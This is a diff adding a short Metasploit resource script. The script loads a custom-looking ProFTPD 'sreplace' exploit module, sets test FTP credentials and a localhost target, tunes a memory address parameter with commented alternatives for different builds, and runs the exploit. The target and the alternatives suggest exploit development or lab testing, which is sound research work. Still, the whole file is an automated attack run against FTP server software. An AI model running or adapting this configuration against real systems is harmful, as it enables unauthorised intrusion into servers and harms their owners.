@@ -1,0 +1,17 @@
+# vim: ft=sh
+
+use exploit/windows/ftp/proftp_sreplace_cleandop
+# use exploit/windows/ftp/proftp_sreplace_dop
+set ftpuser ftptest
+set ftppass ftptest
+
+# original && recompile
+set rhost 127.0.0.1
+# set non_empty_high 0xb7f35001
+set non_empty_high 0xb7f13001
+
+# NUC
+# set rhost 127.0.0.1
+# set non_empty_high 0xb7f18001
+exploit
+quit
